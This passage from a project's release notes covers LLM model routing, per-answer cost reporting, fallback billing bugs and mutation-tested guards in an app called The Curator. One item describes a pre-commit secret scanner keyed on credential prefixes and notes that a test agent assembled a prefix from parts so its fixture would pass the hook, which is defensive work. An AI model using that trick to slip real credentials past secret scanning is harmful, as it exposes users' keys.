statement on a spending surface. **Admitted: `z-ai/glm-5.3-flash` and `moonshotai/kimi-k2-0905`, both `caution`** — glm-5.3 spends **79–86% of its output on hidden reasoning** and timed out 1 run in 9; k2-0905's one repaired run was a **RUNAWAY** (`finish_reason: length`, full budget, **903 pages**, 467 s, 2.2x cost). Both facts are in the note the user reads. **`FALLBACK_CHAINS` deliberately UNCHANGED** — a chain spends the user's money silently, and neither new entry belongs where the app picks unasked. **(7) GUARDS THAT COULD NOT FAIL — SEVEN more, each chased rather than filed.** A mutation harness parsed `Failed:` at line-start against `Passed: 162   Failed: 0` and reported **all twelve of its mutations green**. A test corpus was accidentally price-ascending, so an ordering assertion could never fire. Two eligibility branches were masked by a more general branch emitting the same code. `listOfferableModels` returned a bare CONCATENATION of two ordered lists, so `cheapest` — computed as index 0 — was correct only by accident and would badge the wrong model after any sync; fixed at the MERGE, the one accessor every consumer reads, with free ranked as a CLASS (`free -> 0`, priced -> 1) so no `null` reaches a subtraction. And a guard I wrote myself landed **after `process.exit()`**, where it silently never ran — the same mistake this repo's own notes record. **(8) THE CALIBRATION WAS NOT AN INDEPENDENT REPRODUCTION, and an agent caught me claiming it was.** `poscontrol-solar-pro4.jsonl` is BYTE-IDENTICAL to the 9 pass-1 rows, same millisecond timestamps — one measurement written to two files. The harness IS validated; the second file is not a second run. **Verification: 81 -> 84 offline suites, all green**; `test-chat-model.js` 1178 -> 1260, the picker 848 -> 1267, qualification 197, catalogue-sync 134, eligibility 377; **all seven live end-to-end scenarios PASS on the real app with the real key** — including the decisive one, a promoted model running a REAL INGEST that wrote coherent pages with `tokenUsage.model` naming it — plus adversarial probing of a hand-edited sidecar and a hand-edited config, both refused; real `.curator-config.json` `sha256`-verified unchanged throughout (never mtime); `domains/` untouched; frozen frontend files byte-identical. **KNOWN AND DELIBERATE:** a qualification does not arm the concurrency guard, so a refresh during one is not refused; the 200,000 floor is enforced at ADMISSION but not re-assertable on a built entry, which carries no context field — named in an assertion rather than implied away; a pin to a locally-qualified model goes inert (falling back to a hand-measured model, the fail-safe direction) if the sidecar is missing, and says so only on stderr; and `/old` still does not support OpenRouter. |
| `v3.15.1` | **A money path that was LIVE, not latent — plus a credential guard nobody had supplied, and a test assertion that could not fail.** Four fixes, each mutation-proven RED for a BEHAVIOURAL reason with the restore read back off disk and `shasum`-verified. **(1) THE 404 THAT BILLED USERS FOR A MODEL THEY DID NOT CHOOSE.** Every OpenRouter request carries `provider: {allow_fallbacks:false, require_parameters:true}`. Measured live: when no upstream satisfies the request OpenRouter answers **HTTP 404** — *not* 503, which the surrounding comments assumed — with `No endpoints found that can handle the requested parameters`. `isModelNotFound` returned true for it TWICE over (structurally on `err.status`, and by message), so `callLLM` walked the chain onto `ibm-granite/granite-4.0-h-micro`, a **PAID** rung, and billed a substitution the user never asked for. **v3.15.0 recorded this as unreachable; that was wrong and the agent that fixed it said so.** `minimax/minimax-m3:free` is a shipped, offerable, build-lane-eligible model (`suitability: caution`, `free: true`, price `null`), and an ACCOUNT-level data policy 404s a free id with nothing special sent — so a user on the free model with a training policy on their account was being moved onto a paid model **in production today**. Fixed by splitting the 404 space three ways from frozen, conjunction-matched tables — `routing-constraint` / `model-retired` / `null` — with a **load-time disjointness proof** so a future clause cannot shadow the other list. A retirement is byte-identical to before and still walks; a constraint (or an unclassifiable message) is tagged deterministic, has its `.status` withheld, its prose neutralised, and **does not walk**. `null` deliberately lands with the constraint case: walking on a guess spends money silently, refusing costs one visible error. **Measured live, and the 404 space is narrower than assumed — a bogus model id is a 400, not a 404.** **(2) A GUARD THE ROUTE NEVER SUPPLIED.** `clearApiKey(provider, opts)` takes an `opts.canActivate` predicate and `src/routes/config.js` called it with ONE argument. **This is not an arity bug** — the parameter is defaulted, nothing throws — it is an un-supplied guard, and the default is ALLOW, so disconnecting the active provider handed the BUILD lane to the next keyed provider unconditionally. Harmless today only because `providerCanBuild('openrouter')` happens to be true; a P0 the moment any keyed provider cannot build (`local` has no API key at all), where `getProviderInfo()` throws inside a route `catch` commented *"no key configured yet"* while a key IS configured. One argument. The three-state contract is pinned by **two mutations in opposite directions** — collapsing `activeProvider = null` ("we decided: nobody") into `delete` ("infer from key presence") reds 3 and the third assertion shows the harm: `getActiveProvider()` falls through the legacy ladder and the refusal becomes a no-op. **(3) AN ASSERTION THAT COULD NOT FAIL, AND THE RECORDED MECHANISM WAS WRONG.** `§11.7` picked CHEAPEST by `a.e.input - b.e.input`; a free model's `input` is `null` BY DESIGN (membership, never `0`), and `null - number` coerces, so the free model sorted first *by arithmetic accident*. Then `messageCostUsd` returns `null` for a free model, `formatUsdHonest(null)` returns **`null` — not `''` as previously recorded** — and `escapeHtmlStub(null)` returns `''`, so `.includes('')` is unconditionally true: **2 of 4 rows could not fail whatever the HTML contained.** Fixed by drawing CHEAPEST/DEAREST from paid entries only, giving the free model its own positive assertion (it renders the word *free*, never a dollar figure) with a fixture self-check that the catalogue actually contains one, and — the durable part — **a guard against the vacuous SHAPE itself**: the expectation must be a non-empty string before any `.includes()`, so a future free or unpriced model makes this section go RED instead of quietly inert. Reinstating the bug reds **2 assertions naming the model and the reason**. **(4) THE METADATA WAS NOT MISLEADING — IT WAS NON-DISCRIMINATING, and that is the fact-vs-absence class one level down, inside the analysis of the fact-vs-absence class.** v3.15.0 said `nex-agi/nex-n2-mini` *"advertises reasoning as OPTIONAL"*, implying the catalogue lied. It did not. `nex-n2-mini` (3 of 3 runs unparseable, entire 24,576-token budget spent on hidden reasoning) and `upstage/solar-pro4` (**9 of 9 clean**) carry **byte-identical** reasoning metadata: `{"mandatory": false}`, with `default_enabled` — the field that would signal reasoning-on-by-default — **ABSENT on both** rather than `false`. **74 of 380 catalogued models carry that exact shape**, so it means UNMEASURED, never BROKEN, and must never become a rejection signal. Corrected in `llm.js` and in `docs/model-lifecycle.md`, which carried the identical claim verbatim — the fix to one file had created a fresh two-files-disagreeing instance, which is this repo's most reliable early-warning shape. **TWO GUARDS FOUND DECORATIVE INSIDE THIS RELEASE'S OWN WORK, both chased rather than filed as coverage:** deleting the headline `callLLM` gate left the suite **699/0 green** because a second layer was doing all the work — recorded honestly in the code as defence-in-depth that is *not* independently load-bearing on any production path today, rather than claimed as the fix; and the prose-neutralisation was untested because all three measured messages happen to contain no not-found vocabulary. **A MUTATION THAT NEVER APPLIED REPORTED GREEN** — an anchor matched 2 sites, not 1, and only reading the file back off disk caught it; every mutation in this release was therefore verified present before its result was trusted. **Verification: 81 offline suites green** (`test-openrouter-model-layer.js` 699 -> 712, `test-offerable-models-route.js` 113 -> 166, `test-next-composer-model.js` 723); live end-to-end on the real OpenRouter key with the happy path unbroken; real `.curator-config.json` `sha256`-verified unchanged throughout (never mtime — the maintainer edits it legitimately); frozen frontend files byte-identical; secret scan 0 hits with a positive control. **NOT IN THIS RELEASE, deliberately:** the capability-first model measurement (Qwen/GLM/DeepSeek/Kimi) and the eligibility-filter decision core are complete or in flight but **held back until they are wired**, because v3.15.0's own lesson is that shipping unwired code let a public README promise *"hundreds of models"* while nothing populated the catalogue. |
| `v3.15.0` | **OpenRouter — a third provider, open-weight models from smaller labs, and the discovery that a fact and its ABSENCE had been collapsed into one value in EIGHT places.** The maintainer's ask was affordability: users who cannot pay Gemini or Anthropic prices should still be able to build a second brain. The gateway is OpenAI-COMPATIBLE (a protocol name, NOT OpenAI support — OpenAI itself is ruled out), so ONE adapter with a configurable base URL later serves LM Studio, Ollama and llama.cpp. **(1) THE DECISION, made before any code.** OpenRouter exposes **417** models and the list moves, colliding head-on with the rule v3.12.0 made structural — `defineOfferableModel` THROWS AT MODULE LOAD on a missing measured field, its own error text reading *"a model nobody has measured must not be offered at all"*. Resolved by reading the project's own principle precisely: `docs/model-lifecycle.md` says a model may not be offered **for a FEATURE** it has never been measured against. So: **two admission standards, ONE catalogue, split by LANE.** BUILD (ingest/Health/Compile) takes hand-measured models typed into the static table; CHAT takes the runtime overlay, which now REFUSES anything not `chat-only`. **The honest narrowing: the provider tells us what a model COSTS; we measure whether it can do our JOB.** **(2) ON-DEMAND QUALIFICATION REJECTED ON EVIDENCE.** A probe harness had NEVER existed here — the 14 shipped models were measured in one manual session and only prose in each `note` survived. A realistic outline prompt is **341,005 chars of which **75.5%** is the user's OWN index and slug inventory (127,666 index + 129,857 inventory), the source document supplying the rest at its 80,000-char cap — the *~90%* figure published beside it belongs to a DIFFERENT, ~285,000-char assembly and the two were merged; the sharper and correct statement is that the fixed instruction scaffold is **3,503 chars, ~1%**, so a fresh install with no index and no inventory cannot assemble a realistic probe at all**, so a new user's probe is exactly the toy probe the docs forbid — validity and affordability move in OPPOSITE directions. `jsonRaw` needs ~9 runs, so ONE probe passes a measurably-broken model **~78%** of the time, laundering a coin-flip into a "measured" badge. **(3) THE FILTER IS STRUCTURAL; THE LAST STEP IS NOT.** Live-verified: the models endpoint is PUBLIC, and its prices matched this project's independently hand-verified table **5 for 5**. Refused by construction: **49** models with no JSON mode, **5** routers priced `"-1"` (price unknowable until AFTER the call — incompatible with showing a price before you choose), **12** `~*-latest` aliases (they silently change what the user picked). 417 -> **286** eligible. **But `supported_parameters` says a model ACCEPTS JSON mode, never that the JSON PARSES** — and `gemini-3.5-flash-lite`, which we demoted for unrepairable JSON in 2 of 9 runs, appears there as fully capable. **(4) WHAT MEASUREMENT CAUGHT THAT METADATA COULD NOT.** Three models admitted after 9 runs each (**$0.086 total spend**): `upstage/solar-pro4` 9/9 raw JSON, median 23 pages, the new `DEFAULTS.openrouter`; `ibm-granite/granite-4.0-h-micro` 9/9, the sole chain rung, **cheaper than the default it backs**; `minimax/minimax-m3:free` 8/9 + 1 repaired, **FREE**. Rejected: **`nex-agi/nex-n2-mini` advertises reasoning as OPTIONAL and spent its ENTIRE 24,576-token output budget on hidden reasoning, returning nothing parseable, 3/3** — it passed every structural filter; only the real prompt caught it. Also rejected: one unmeasurable through rate limits, one expiring inside this release's lifetime, one whose ceiling is below what ingest requests. **(5) THE MONEY LANDMINE, dormant and armed by this very work.** `callProvider` had `if (provider === 'gemini') {...}` then an UNCONDITIONAL Anthropic client — no `else`. The moment a third provider existed, an OpenRouter request would go to api.anthropic.com on the user's ANTHROPIC key, 404, be classified RETRYABLE, and **walk the ANTHROPIC fallback chain — spending real money on Sonnet while the user believed they were on a free model.** The mutation restoring it produces **38 RED** including `NOT ONE Anthropic client was constructed (got 17, expected 0)`. **(6) A P0 FOUND OUTSIDE AN AGENT'S OWN FILES.** Saving an OpenRouter key flipped `activeProvider` to a provider with no build model: `getProviderInfo()` THREW, ingest/Health/Compile all broke, and the route swallowed it in a `catch` commented *"no key configured yet"* while a key WAS configured. Fixed by an INJECTED predicate — **and the refusal was then found to be a NO-OP**, because refusing meant OMITTING `activeProvider` while omission already meant *infer from key presence*. Now `null` means "we decided: nobody" and absence still means "written before this field existed". **(7) `suitability: 'chat-only'` WAS A DECORATIVE BADGE.** Read in exactly THREE places, all badge rendering. A user could pin `gemini-3.5-flash-lite` — noted *"2 of 9 live runs returned JSON that neither JSON.parse nor jsonrepair could repair"* — as their BUILD model. Now enforced at two layers, each mutation-proven SEPARATELY. **(8) A FACT AND ITS ABSENCE, COLLAPSED IN EIGHT PLACES, each a different bug.** `chargeForItem` INVENTED **$0.14** of spend for a free model (`getModelPrice()` returns null by design, so it fell to the estimate branch); `createJob` REFUSED a budget cap, pushing users to run with none; the chat composer said *"price unavailable"*; Settings rendered blank; the per-answer cost rendered nothing; `compareModelCost` filed free under *"we have no price"*; Health's spend button said **"cost unknown"** on the one model whose cost is known exactly; and a docblock in `llm.js` asserted three of these were *"already implemented and already correct"*. **None was found by reading — all surfaced the moment a free model actually existed and those paths were EXECUTED.** **(9) SIX GUARDS THAT COULD NOT FAIL.** The 126-case money mirror passed `estimate: null`, which made the buggy branch return `0/1` — **it could never have gone red on a phantom charge of any size**. A cheapest-first control passed because `null <= 0.017` is true. `onWarn` had zero coverage anywhere. A promotional-price assertion CRASHED and hid every assertion after it. One asserted `f(x) === f(x)`. One claimed a credential never appears in a URL while its fetch spy DISCARDED the url argument. Measured "before" numbers: a reason-key rename left a suite at **836/0**; a 10x digit typo on the OpenRouter default's output ceiling shipped at **1144/0**, green in five sibling suites. **(10) CANCEL DID NOT CANCEL.** `dispose()` sat in the fetch's `finally`, and fetch resolves on HEADERS — so the abort listener and the timeout were torn down before the body read, where all the time goes. Measured: abort fired at 1,999 ms, body finished at **39,653 ms**; a real cancel took **25.9 s** while the in-flight batch completed and was billed. v3.4.0's *"zero LLM calls after the cancel"* was NOT TRUE for OpenRouter. **And the obvious fix was wrong**: moving `dispose()` alone made the timing right and the ERROR wrong — the abort landed in the JSON catch and was translated, invisible to `isAbortError`, so a cancelled call would have been RETRIED. **(11) THE SECRET GUARD DID NOT KNOW THE CREDENTIAL THIS RELEASE INTRODUCES.** The pre-commit hook blocked `AIza`, `sk-ant-` and `ghp_` but not `sk-or-v1-`, so a real key pasted into a fixture would have committed silently to a PUBLIC repo. Fixed at the source of truth, verified 6/6 in a throwaway repo asserting on whether the commit LANDED. **Both test agents then declined to have their fixtures allow-listed** — one assembled the prefix from parts, the other renamed its fixture — on the reasoning that allow-listing our own fixture trains the next person to allow-list. **(12) DOCS: ~40 false claims across three passes**, including *"OpenRouter — not supported. There is no way to route The Curator through it."*, a user guide that CONTRADICTED ITSELF on whether OpenRouter can build, and a public README promising **"hundreds of models"** when the real offer is 17 and nothing populates the runtime catalogue. **Verification: 80 -> 81 offline suites, all green**; live end-to-end on real models — chat naming the model that actually served, a real ingest whose predicted cost **matched the account delta exactly** ($0.000309), a free ingest charging a true zero verified against the account, a deterministic 503 failing in 254 ms instead of pausing the batch permanently, and all three providers regressing clean; frozen shipping files byte-identical; real `.curator-config.json` `sha256`-verified throughout; MCP stdout pure with 18 tools and 0 stderr bytes. **KNOWN AND DELIBERATE:** `/old` does NOT support OpenRouter (byte-frozen); free-model rate-limit FIGURES are printed nowhere because they could not be verified — the app reports the tier it reads from the user's own key; free models sit on a shared upstream pool (measured: one answered 8/8 while three siblings answered 0/8 over ten minutes); and whether free routing permits training on your data is documented as an OPEN QUESTION rather than asserted, with the measured fact that `data_collection: 'deny'` is accepted on paid models and 404s on free ones, so the two are not combinable. |
| `v3.14.0` | **The polish pass that closes Gemini + Anthropic model choice: which model builds your wiki, what each answer cost, and a promotional warning that would have started lying on 2 Jan 2027.** **(1) THE BUILD LANE, NAMED.** The maintainer flipped his active provider mid-session and it silently changed what his next ingest would cost, with no on-screen signal. Settings showed a pinned model under EACH provider while only the ACTIVE one governs ingest, Health and Compile. The active section now reads *"This model builds your wiki"* and names all three; the inactive one reads *"This model does not build your wiki"*, states that activating the provider hands it all three, and that chat can still use it meanwhile. **The framing is the maintainer's and it is better than the brief's:** listing three features invites the reader to wonder whether they could differ. They cannot. **ONE model builds your brain; chat is the one place you choose.** That is structural, not conventional — `generateText` carries provider/model in argument SIX, and all five `health-ai.js` calls are four-argument while `compile.js` is five, so an override there is not unused, it is INEXPRESSIBLE. `query.js` (3 args), `diagnostics.js` (4) and both Shared Brain wrappers (4) are the same. **`ingest.js` is the exception and is documented as such** — it DOES pass an opts object (`onUsage`, `signal`), so an override is syntactically expressible there and simply never passed, which is why ingest's protection is the route-level `guardConcurrent` rather than a call-site accident. Collapsed height unchanged at **680px**; both-open +31px. **(2) PER-ANSWER COST, and the agent STOPPED rather than fake it.** Sent to build a cost line, it found the token counts never reach the client — proven three ways, including the live wire response's full key set on both providers — and refused to estimate from character counts, reporting the exact backend change instead. That change then landed: `onUsage` captures the four counts under the rule already written for the model (**reported or absent, never inferred**), `buildAssistantMessage` appends `usage` LAST so an untouched message serialises byte-identically, and `sendMessage` returns it. **The spec was three edits and needed four** — the client's live-send push must carry `usage` too, or the cost appears only after a reload. Presentation is one muted fragment on the eyebrow the model label already occupies (`THE CURATOR · Opus 5 · $0.01`), token counts on hover, and **nothing at all** when any component is missing — not `$0.00`, not a dash. Measured live, same question, same conversation: `gemini-2.5-flash-lite` 494/98 -> **$0.0001**, `claude-opus-5` 998/247 -> **$0.01**, **126x apart**, surviving a full reload. **Cross-checked independently of the field under test:** Anthropic's own `count_tokens` on the reconstructed prompt returned `input_tokens: 998`, exactly what the app recorded and priced. **(3) `{0,0,0,0}` IS A SENTINEL, NOT A MEASUREMENT — found by writing the test, not by anticipating it.** `llm.js`'s normalisers coerce every missing field to `0`, so a provider returning NO usage block arrives as four zeros and would price a paid answer at exactly `$0.00` — the defect `format-usd.js` exists to prevent, arriving through a different door. A completed turn cannot consume zero input (the prompt is schema plus thousands of chars of wiki context), so zero-in AND zero-out can only mean *we were not told*. Refused in `chat.js`, deliberately NOT in `llm.js`, where `0` is the correct neutral element for the ingest queue's running total. Narrow by design: zero on one axis alone is still a real report and still prices. **(4) THE MONEY FORMULA IS MIRRORED, AND THE MIRROR IS MEASURED.** `chargeForItem` lives in `ingest-queue.js`, which imports `fs` and cannot run in a browser, so the formula is copied — and two hand-maintained copies of a money formula is this repo's v3.2.0 CRITICAL shape. So the suite EXTRACTS the real `chargeForItem` by brace-match, injects the real `getModelPrice`, and asserts exact equality over **126 cases** (14 models x 9 token shapes) enumerated from the live catalogue. Change either side alone and it goes red naming the case. The inherited Gemini-implicit-cache approximation (Anthropic's 0.1x multiplier applied to a discount that is not Gemini's) is pinned by the same assertion and documented rather than silently inherited. **(5) A PROMOTIONAL WARNING THAT WOULD HAVE STARTED LYING.** Unbriefed, found beside a wording fix: the composer gated the rise notice on `promotionUntilIso` being truthy, and that field stays populated AFTER expiry — so from 2 Jan 2027 it would have announced *"rises to $1.50"* beside a price line already reading $1.50, warning about a change that had already happened, on a spend surface. Settings has guarded this since the picker shipped; the composer never did. Suppressed only on POSITIVE evidence of expiry — if any of the four figures is missing, expiry cannot be proven and it still warns. **(6) VOCABULARY UNIFIED, COMPOSER ADOPTING SETTINGS' WORDING:** `chat only` -> `chat only — not for ingest` (the short form understates what was measured), and the rise date humanised from raw ISO to `1 Jan 2027`. The price separator was deliberately NOT unified — switching it would have made the rise line disagree with the price line directly above it in the same row. **(7) A COMMENT CONTRADICTING ITS OWN FILE.** `views/chat.js` called `state.chatModel` a *"per-conversation model id"* while the docblock 1,450 lines below correctly explained it is per-BROWSER — two comments in one file disagreeing about one variable, which is the strongest form of this repo's most-recurring shape. Corrected, and the dependency recorded: sticky-per-browser is safe BECAUSE every answer names the model that produced it, so removing that label would silently remove the argument for the stickiness. **(8) MUTATIONS THAT TAUGHT SOMETHING.** Testing the date helper via `new Date().toLocaleDateString` passes EVERY same-process assertion on a machine east of Greenwich; it goes red only in child processes under `America/Los_Angeles`, with a positive control proving the buggy form really renders `31 Dec 2026`. Without that section the docblock's timezone claim would have been a comment, not a guard. The pre-existing `test-next-cost-honesty.js` stayed **159/0 green** under a bespoke-formatter mutation because it guards only `domains.js` and `ingest.js` — nothing would have caught it without the new assertions. And an agent's shell wrapper ate an argument so a mutation NEVER APPLIED while reporting *"470 green, RESTORED ok"*, which looks exactly like a harmless mutation; only reading the file back off disk caught it. **(9) A CROSS-AGENT HAZARD WORTH RECORDING:** Playwright MCP is a SHARED browser across agents. One agent's tab was navigated out from under it mid-run and a `Set active` click intended for its own instance landed on ANOTHER agent's server. It caught this, stopped, re-ran on a self-launched browser with a `location.port` guard on every call — and that guard then caught a second call that had silently jumped origin, plus a screenshot that had captured the other agent's view entirely. **(10) THE `FN_NAMES` BLIND SPOT, closed generally within one suite.** A hardcoded function list meant a new helper made the suite CRASH rather than fail — the v3.11.0 shape, still open elsewhere. The suite now enumerates every top-level function and imported binding, resolves every called identifier, and emits a NAMED failing assertion before execution instead of a `ReferenceError`. Two positive controls prove the detector fires. **Explicitly NOT ported:** every other suite lifting functions by a hardcoded list still has it. **(11) DOCS, in the same release.** The two-lane principle across the user guide, architecture, model-lifecycle and README — describing BEHAVIOUR, never quoting UI strings, because that copy was being rewritten by two other agents as the docs were written. Four corrections to the orchestrator's own brief (Compile is inexpressible not merely unpassed; `getActiveProvider` is called INSIDE `resolveProviderDefault`; `applyModelOverride` runs at TWO rungs; `ingest.js` is the exception), one broken anchor repaired, and a gap closed that nothing had documented: **a pin under a non-active provider is inert**, which is the likeliest user-facing surprise in the whole router. Plus another false claim found and fixed — `architecture.md` stated *"Conversations are gitignored — they are personal to each user's machine"*, contradicting both `DOMAINS_GITIGNORE_RULES` and this file's own v3.0.14 entry recording that conversations are deliberately synced. An agent also caught itself overclaiming that the 126x gap was *purely* price, checked the arithmetic, found Opus had used ~2x the tokens, and corrected it. **Verification: 80 offline suites green throughout**; `test-chat-model.js` 929 -> **1000**, `test-next-composer-model.js` 350 -> **560**, `test-next-model-picker.js` 361 -> **470**; twelve files changed across five agents with zero collisions; frozen shipping files byte-identical; real `.curator-config.json` `sha256`-unchanged; every internal doc link and anchor validated at 0 broken. |
| `v3.13.2` | **The chat told you which model you PICKED, not which model answered — and it had been dead data since the picker shipped.** The maintainer selected `claude-sonnet-5`, saw `THE CURATOR · Sonnet 5` above every reply, and could not reconcile it with his Anthropic dashboard. The routing was fine; the reporting was not. `sendMessage` has always captured `usedModel` from the provider's OWN usage payload and returned it as `model`, and `routes/chat.js` is a bare `res.json(result)` so it reached the client intact — with **zero readers in the view**. The label was re-derived from `state.chatModel`, the REQUEST. That is exactly the `M3b` shape an earlier agent found: reporting the request rather than the outcome passes every refusal test and fails only the fallback-walk, so a silently-refused model (designed behaviour — `applyModelOverride` falls back rather than throwing) still displayed the user's pick. **ONE EXPRESSION CARRIED TWO BUGS.** It read the request instead of the outcome, AND it computed ONE label for the WHOLE THREAD — so changing the dropdown relabelled historical answers with a model that never saw them. Scrolling back through a conversation where you switched models showed every message claiming the current one. The label now comes from `m.model` on the message itself; the send path records `model: data.model` (server-measured) alongside `requestedModel` captured at click time, because the composer is live during the call. **A message with NO recorded model renders the neutral provider label — never the current selection, because that fallback IS the bug**; an unknown id renders the raw id rather than being relabelled as something else; `Object.hasOwn` guards the provider-label lookup so `__proto__` cannot render as `[object Object]`. Divergence is surfaced as fact, not alarm: *"Requested Flash 2.5 — answered by Haiku 4.5. You are billed for the model that answered."* — no icon, no animation, `--text-3`. **PERSISTENCE, so a past answer stays auditable.** `buildAssistantMessage(content, citations, servedProvider, servedModel)` writes `provider`/`model` onto the stored message ONLY when the provider actually reported them, so existing conversations load byte-unchanged and a missing value means *unknown*, never *the default*. Before this, the conversation JSON stored `role`, `content`, `citations` and nothing else — there was no record anywhere of which model answered anything, which is why the maintainer's only recourse was a billing dashboard that lags. **LIVE PROOF, both turns in ONE thread so the whole fix is visible in a single frame:** turn 1 requested `claude-sonnet-4-6` and was answered by `claude-sonnet-4-6` with no notice; turn 2 requested `gemini-2.5-flash` with that key removed from the ISOLATED config — a genuine refusal, not a stub — fell back to `claude-haiku-4-5`, and rendered the divergence. With the picker still showing **Flash 2.5**, message 1 continued to read **Sonnet 4.6**. Pre-fix, both would have read *Flash 2.5*, quoting $0.30/$2.50 for an answer billed at $1/$5. Cross-checked against the server's own conversation JSON. **AND THE ROUTING ITSELF PROVEN AT THE WIRE, not by reading our own fields.** The isolated instance was run through a transparent logging proxy via `ANTHROPIC_BASE_URL` — an SDK-native seam, no source touched — recording both the model the app put on the wire and the model Anthropic's own `message_start` echoed back. Requested `claude-sonnet-5` -> wire `claude-sonnet-5` -> **billed `claude-sonnet-5`**; `claude-opus-5` likewise; a model whose provider has no saved key, a non-offerable `gpt-4o`, and a request with no model at all each fell back silently to the provider default and still answered. Total measured spend **$0.0115** across six calls. The field names were confirmed to match on both sides — `views/chat.js` spreads `model` in only when a model is chosen, `routes/chat.js` destructures `model` — so the picker was never silently broken on the real path, and the running app was confirmed as v3.13.1 with `restartRequired: false`, ruling out a stale pre-v3.13.0 process. **The one remaining silent-ignore is named rather than implied away:** a body carrying `model` with NO `provider` resolves to the default, because `normalizeChatModel` gates on the caller-named provider — and the shipping composer cannot produce that shape, since every write to `chatModel` sets `modelProvider` alongside it. **A provider quirk worth knowing:** Anthropic echoes the ALIAS verbatim for `claude-sonnet-5`/`claude-opus-5` but resolves `claude-haiku-4-5` to the dated snapshot `claude-haiku-4-5-20251001` — same model, same billing, but the record therefore stores the alias rather than the snapshot. **An agent removed production surface it had itself added:** it threaded an `opts.generateText` seam into `sendMessage`, then found on reading the suite that §15 already drives the real path via `__setAnthropicClientFactory`, and deleted the seam as unnecessary. **Verification: 80 offline suites green**; `test-chat-model.js` 858 -> **929**; `test-next-composer-model.js` 301 -> **350**; four mutations RED for behavioural reasons — labelling from the composer selection (the shipped bug) reds **14**, falling back to the selection when no model is recorded reds 4, dropping the divergence notice reds 3, dropping escaping reds 3 — each read back off disk before being trusted and each restore `shasum`-identical. **NAMED NOT ENFORCED:** the new section is FUNCTION-scoped, the v3.13.0 `test-next-provider-rows.js` finding — a call-site mutation re-inlining a thread-level label leaves it green, and only the browser pass covers that. **Also recorded:** history replay shows the model but no divergence notice, because the stored record carries the served model and not the request; that is the honest limit rather than a guess. **And a process note kept rather than tidied away:** an agent restored its files mid-run from a backup taken BEFORE two later hardening edits, silently reverting them, and caught it only by grepping for a marker string instead of trusting the copy — the same lesson this repo keeps re-learning, that a restore must be read back and checked, not assumed. |
| `v3.13.1` | **The documentation for model choice — and four comments that had started asserting the opposite of their own code within hours of being written.** v3.13.0 shipped the feature with `api-reference.md` and `model-lifecycle.md` updated but the USER-FACING docs untouched, which breaks this project's own rule that documentation is current in the SAME release as the behaviour change. Closed here. **(1) THE USER GUIDE gets a new section built around the question the maintainer actually asked — *why were these models chosen, on what criteria*.** Five measured axes, each probed live against the app's REAL ingest outline prompt on real prose rather than read off a spec sheet: price (verified against the providers' live pricing pages, never a cached table), maximum output tokens (non-monotonic — `claude-sonnet-4-5` caps at 64k while `4-6` does 128k), hidden thinking tokens (billed as OUTPUT and sharing the answer's budget — `claude-sonnet-5` spent ~52% of its output on reasoning the user never sees), JSON reliability (one Gemini model returned output that neither the parser nor the repair pass could fix in 2 of 9 runs; `claude-haiku-4-5`, the shipping default, fences its JSON 3/3 and depends entirely on the repair path), and outline coverage from identical source (Opus 25-27 pages, Haiku 5-13). Plus the two rules that fall out of it: **never offer an unmeasured model** (two Opus versions are excluded for precisely that reason) and **never hide a working one** — a flagged model stays pickable with its measured reason on screen, because the principle is honest labels rather than a curated-down list. Also documents the badge vocabulary, the promotional prices and the pinning trap, the honest cost span (**50x input / 62x output**, and the ~1.33x tokenizer premium that makes Opus effectively **~6.6x** the Haiku baseline rather than 5x), why the app REFUSES a model change mid-ingest, and what is not available yet. **(2) `architecture.md` gains the router.** The frozen capability record and the rule that an incompletely-specified model **fails to exist** (the module refuses to load); the allow-list's single application point inside `getProviderInfo()` and why (seven other `generateText` entry points; the v3.2.0 two-copies shape); the FIVE model-producing sites and their deliberate `LLM_MODEL` asymmetry; precedence **per-call > `LLM_MODEL` > stored > `DEFAULTS`** with a reason per rung; refusal-as-fallback in three distinct cases; `RETIRED` vs `DOMINATED` vs `AWAITING_MEASUREMENT` as three lists with three meanings; why `FALLBACK_CHAINS` and `OFFERABLE_MODELS` are governed differently; date-resolved promotional pricing with every failure direction landing on the HIGHER price; and config read fresh-per-call, never snapshotted. **(3) EIGHT PRE-EXISTING FALSE CLAIMS, found by looking rather than by being told.** The worst were in the user guide and had just been invalidated: *"There is **no model picker in Settings** — each provider's model is pinned by the app"*; *"you don't pick specific model versions; that's set globally"*; *"The amber 'Using fallback model' banner exists only in `/old`"* (false since **v3.9.0**); Anthropic Haiku listed as *"Optional fallback"* when it is the Anthropic **default**; and *"A **paperclip** button sits to the left of both. It is disabled"* — an affordance **removed at cutover**, still documented as present. `architecture.md` additionally described `generateText`'s `opts` as carrying four fields (it is five) and asserted *"the model id is always `DEFAULTS[provider]`, never client-supplied"*, which v3.13.0 made false. **(4) FOUR COMMENTS ASSERTING THE OPPOSITE OF THEIR OWN CODE, hours old.** `views/settings.js` carried *"NOT A CONTROL, AND THAT IS DELIBERATE … there is no radio and no 'Use this model' button … no model endpoint exists"* directly above the code rendering **Use this** buttons against `POST /api/config/api-keys/model`. `views/chat.js` carried *"THE MODEL PICKER IS BUILT AND PROVEN BUT DELIBERATELY OFF … flip this to `true` in the same change that lands the backend plumbing"* directly above `const MODEL_PICKER_ENABLED = true` and a backend that reads `model`. And `test-next-composer-model.js`'s own header still said *"It ships behind `MODEL_PICKER_ENABLED = false`"* and *"Nothing here proves the BACKEND honours a model — it does not."* This is the project's most reliable early-warning shape (v3.7.0 found FOUR docblocks contradicted by code in their own file, one confidently directing the next reviewer to re-fix a hole already closed), and it recurred here in under a day. **All four were rewritten to preserve the reasoning that is STILL TRUE and delete only the expired conclusion** — chat.js keeps its record of WHY the gate was held shut (a user picking "Opus 5 · $5/$25" would have been served Haiku at $1/$5, a falsehood about capability AND money), because the next person deciding whether to gate a feature benefits from it; settings.js keeps the still-load-bearing rule that the write is never optimistic. Deleting the blocks would have lost the lesson along with the staleness. **(5) BADGE VOCABULARY DRIFT, and the coverage gap under it.** The same `dominated: true` flag rendered as **`out-performed`** in Settings and **`dominated`** in the composer — two words for one fact in one app. Unified on `out-performed` (the field name is measurement jargon, not language a user thinks in); the underlying `dominated` field is untouched. **The finding beneath it: NO assertion in either suite checked the literal badge word** — only the CSS marker class — so the two surfaces could have disagreed forever and stayed green.
